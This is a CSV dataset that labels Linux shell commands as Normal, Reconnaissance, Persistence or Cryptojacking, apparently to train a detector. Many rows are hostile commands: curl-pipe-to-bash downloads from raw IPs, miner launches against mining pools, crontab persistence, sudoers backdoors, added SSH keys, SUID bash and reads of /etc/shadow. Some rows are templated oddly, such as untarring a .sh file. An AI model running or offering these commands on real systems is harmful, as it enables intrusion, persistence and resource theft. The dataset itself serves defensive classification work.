command,label
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://github.com/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./kdevtmpfsi -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
whoami,Normal
crontab -e,Persistence
cat /etc/shadow,Reconnaissance
history,Normal
chmod u+s /bin/bash,Persistence
crontab -e,Persistence
ps aux | grep root,Reconnaissance
history,Normal
wget http://185.12.33.1/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o pool.supportxmr.com:3333,Cryptojacking
nohup ./xmr-stak -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
curl -s http://bitbucket.org/miner.tar.gz | bash,Cryptojacking
cd /home/user && pwd,Normal
whoami,Normal
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://45.33.32.156/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./xmr-stak -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
cat /etc/shadow,Reconnaissance
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
cat /proc/cpuinfo; pkill -f minerd; wget https://45.33.32.156/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./minerd -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
cat /etc/shadow,Reconnaissance
uname -a && id && w,Reconnaissance
ip a && route -n,Reconnaissance
clear,Normal
netstat -tulpn,Reconnaissance
cat /proc/cpuinfo; pkill -f coinminer; wget https://github.com/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./coinminer -o minexmr.com:443' >> /etc/crontab,Cryptojacking
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
uname -a && id && w,Reconnaissance
cat /etc/passwd,Reconnaissance
cd /home/user && pwd,Normal
clear,Normal
ping -c 4 185.12.33.1,Normal
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
htop,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
nohup ./kdevtmpfsi -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
echo 'checking system logs',Normal
nohup ./minerd -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
nohup ./coinminer -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
cat /etc/shadow,Reconnaissance
history,Normal
top -n 1,Normal
ps aux | grep root,Reconnaissance
htop,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
cat /etc/passwd,Reconnaissance
ls -la /var/log,Normal
uname -a && id && w,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
nohup ./coinminer -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
whoami,Normal
crontab -e,Persistence
ping -c 4 github.com,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
crontab -e,Persistence
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
cat /etc/shadow,Reconnaissance
curl -s http://142.250.190.46/syslogd | bash,Cryptojacking
cat /proc/cpuinfo; pkill -f xmrig; wget https://142.250.190.46/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./xmrig -o minexmr.com:443' >> /etc/crontab,Cryptojacking
wget http://bitbucket.org/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o xmrpool.eu:9000,Cryptojacking
chmod u+s /bin/bash,Persistence
uname -a && id && w,Reconnaissance
nohup ./kdevtmpfsi -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
history,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
cat /etc/shadow,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
history,Normal
echo 'checking system logs',Normal
cat /proc/cpuinfo; pkill -f coinminer; wget https://bitbucket.org/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./coinminer -o minexmr.com:443' >> /etc/crontab,Cryptojacking
curl -s http://142.250.190.46/install.sh | bash,Cryptojacking
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
ls -la /var/log,Normal
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
cat /etc/shadow,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
netstat -tulpn,Reconnaissance
crontab -e,Persistence
chmod u+s /bin/bash,Persistence
chmod u+s /bin/bash,Persistence
ping -c 4 45.33.32.156,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
ps aux | grep root,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
history,Normal
cat /proc/cpuinfo; pkill -f minerd; wget https://192.168.1.50/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./minerd -o minexmr.com:443' >> /etc/crontab,Cryptojacking
netstat -tulpn,Reconnaissance
cat /var/log/syslog | grep error,Normal
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
cd /home/user && pwd,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
ls -la /var/log,Normal
crontab -e,Persistence
cat /etc/passwd,Reconnaissance
ps aux | grep root,Reconnaissance
nohup ./cpuminer -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
top -n 1,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
whoami,Normal
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://github.com/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./kdevtmpfsi -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
htop,Normal
history,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /proc/cpuinfo; pkill -f minerd; wget https://bitbucket.org/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./minerd -o minexmr.com:443' >> /etc/crontab,Cryptojacking
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://bitbucket.org/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./xmr-stak -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
history,Normal
nohup ./kdevtmpfsi -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
nohup ./minerd -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
curl -s http://185.12.33.1/miner.tar.gz | bash,Cryptojacking
sudo apt-get update && sudo apt-get upgrade,Normal
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://bitbucket.org/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./xmr-stak -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
top -n 1,Normal
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
top -n 1,Normal
ls -la /var/log,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
history,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo 'checking system logs',Normal
cat /etc/shadow,Reconnaissance
cd /home/user && pwd,Normal
cd /home/user && pwd,Normal
curl -s http://bitbucket.org/miner.tar.gz | bash,Cryptojacking
top -n 1,Normal
top -n 1,Normal
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
ps aux | grep root,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
ls -la /var/log,Normal
crontab -e,Persistence
netstat -tulpn,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
ip a && route -n,Reconnaissance
curl -s http://45.33.32.156/syslogd | bash,Cryptojacking
clear,Normal
ps aux | grep root,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
curl -s http://142.250.190.46/miner.tar.gz | bash,Cryptojacking
cat /etc/shadow,Reconnaissance
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
crontab -e,Persistence
cd /home/user && pwd,Normal
crontab -e,Persistence
uname -a && id && w,Reconnaissance
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
sudo apt-get update && sudo apt-get upgrade,Normal
htop,Normal
htop,Normal
whoami,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
cat /proc/cpuinfo; pkill -f cpuminer; wget https://bitbucket.org/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./cpuminer -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
cat /var/log/syslog | grep error,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo 'checking system logs',Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
nohup ./minerd -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
history,Normal
cat /var/log/syslog | grep error,Normal
history,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
wget http://45.33.32.156/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o pool.supportxmr.com:3333,Cryptojacking
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
nohup ./xmr-stak -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
cat /proc/cpuinfo; pkill -f xmrig; wget https://192.168.1.50/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./xmrig -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
crontab -e,Persistence
crontab -e,Persistence
chmod u+s /bin/bash,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
crontab -e,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
nohup ./minerd -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
ps aux | grep root,Reconnaissance
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
ip a && route -n,Reconnaissance
curl -s http://10.0.0.5/cron.sh | bash,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
ls -la /var/log,Normal
ping -c 4 192.168.1.50,Normal
htop,Normal
cat /etc/shadow,Reconnaissance
ip a && route -n,Reconnaissance
top -n 1,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
curl -s http://bitbucket.org/install.sh | bash,Cryptojacking
cat /var/log/syslog | grep error,Normal
ip a && route -n,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
cat /var/log/syslog | grep error,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
htop,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
ip a && route -n,Reconnaissance
cd /home/user && pwd,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
cat /proc/cpuinfo; pkill -f coinminer; wget https://142.250.190.46/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./coinminer -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo 'checking system logs',Normal
ping -c 4 142.250.190.46,Normal
echo 'checking system logs',Normal
cd /home/user && pwd,Normal
cat /etc/shadow,Reconnaissance
crontab -e,Persistence
whoami,Normal
echo 'checking system logs',Normal
ping -c 4 192.168.1.50,Normal
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /etc/shadow,Reconnaissance
uname -a && id && w,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
crontab -e,Persistence
cd /home/user && pwd,Normal
cat /etc/passwd,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
wget http://45.33.32.156/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o nanopool.org:14433,Cryptojacking
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://10.0.0.5/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./kdevtmpfsi -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
curl -s http://github.com/cron.sh | bash,Cryptojacking
history,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
curl -s http://192.168.1.50/cron.sh | bash,Cryptojacking
htop,Normal
echo 'checking system logs',Normal
history,Normal
nohup ./kdevtmpfsi -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
uname -a && id && w,Reconnaissance
history,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
ping -c 4 github.com,Normal
wget http://185.12.33.1/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o xmrpool.eu:9000,Cryptojacking
nohup ./minerd -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
curl -s http://185.12.33.1/install.sh | bash,Cryptojacking
ps aux | grep root,Reconnaissance
ip a && route -n,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
echo 'checking system logs',Normal
cat /etc/shadow,Reconnaissance
clear,Normal
echo 'checking system logs',Normal
history,Normal
cat /proc/cpuinfo; pkill -f coinminer; wget https://45.33.32.156/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./coinminer -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
history,Normal
nohup ./xmr-stak -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
ip a && route -n,Reconnaissance
top -n 1,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
netstat -tulpn,Reconnaissance
whoami,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /etc/shadow,Reconnaissance
cat /var/log/syslog | grep error,Normal
cd /home/user && pwd,Normal
cat /etc/passwd,Reconnaissance
htop,Normal
cd /home/user && pwd,Normal
netstat -tulpn,Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
wget http://142.250.190.46/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o monerohash.com:3333,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
ps aux | grep root,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
ping -c 4 45.33.32.156,Normal
netstat -tulpn,Reconnaissance
crontab -e,Persistence
crontab -e,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
cat /proc/cpuinfo; pkill -f cpuminer; wget https://45.33.32.156/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./cpuminer -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
wget http://185.12.33.1/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o xmrpool.eu:9000,Cryptojacking
cat /etc/shadow,Reconnaissance
wget http://142.250.190.46/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o nanopool.org:14433,Cryptojacking
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
echo 'checking system logs',Normal
netstat -tulpn,Reconnaissance
htop,Normal
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://192.168.1.50/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./xmr-stak -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
curl -s http://192.168.1.50/miner.tar.gz | bash,Cryptojacking
echo 'checking system logs',Normal
whoami,Normal
clear,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
cat /etc/shadow,Reconnaissance
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
history,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://10.0.0.5/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./kdevtmpfsi -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
cd /home/user && pwd,Normal
netstat -tulpn,Reconnaissance
nohup ./kdevtmpfsi -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
chmod u+s /bin/bash,Persistence
htop,Normal
wget http://bitbucket.org/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o monerohash.com:3333,Cryptojacking
uname -a && id && w,Reconnaissance
whoami,Normal
cd /home/user && pwd,Normal
ls -la /var/log,Normal
echo 'checking system logs',Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
clear,Normal
ping -c 4 142.250.190.46,Normal
cat /etc/shadow,Reconnaissance
crontab -e,Persistence
ip a && route -n,Reconnaissance
cat /etc/passwd,Reconnaissance
cat /etc/shadow,Reconnaissance
cat /etc/passwd,Reconnaissance
uname -a && id && w,Reconnaissance
wget http://45.33.32.156/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o nanopool.org:14433,Cryptojacking
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
crontab -e,Persistence
clear,Normal
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
cat /proc/cpuinfo; pkill -f xmrig; wget https://142.250.190.46/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./xmrig -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
echo 'checking system logs',Normal
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://142.250.190.46/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./kdevtmpfsi -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
ip a && route -n,Reconnaissance
ls -la /var/log,Normal
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
htop,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://142.250.190.46/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./xmr-stak -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
